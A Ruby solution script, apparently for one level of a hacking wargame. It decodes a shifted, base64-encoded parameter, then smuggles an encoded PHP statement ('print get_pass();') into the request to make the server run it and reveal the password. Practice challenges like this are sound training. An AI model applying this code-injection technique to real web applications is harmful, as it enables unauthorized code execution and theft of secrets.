# encoding: utf-8
require_relative 'hack_utils'
require 'base64'

# shift 5 char

default_param = "dXduc3kgNDg7"
decoded = Base64.decode64(default_param)
puts "base64 decode: '%s' -> '%s'" % [ default_param, decoded ]
puts "shift 5 chars '%s' -> '%s'" % [decoded, decoded.unpack('c*').map{|c| "%c" % (c-5)}.join]

def post_command(command)
  cmd = command.unpack('c*').map{|ch| "%c" % (ch>=0x61 ? ch+5 : ch) }.join
  enc= Base64.encode64(cmd)
  url = HackUtils::BASE_URL + "take48.php?no=#{enc}"
  resp = RestClient.post(url,  :pass =>'xxxxxxxxxxxxxxxxxxx')
  doc = Nokogiri::HTML(resp.body)
  puts "command: #{command}"
  puts "encoded: #{cmd}"
  puts "base64: #{enc}"
  puts doc.css('div.hero-unit h2').text
  return doc.css('div.hero-unit h2').text.sub(/^Take#/,'')
end

pass = post_command('print get_pass();')
url = HackUtils::BASE_URL + 'take48.php?no=dXduc3kgNDg7'
HackUtils.post_answer_with_url(url, :pass =>pass)

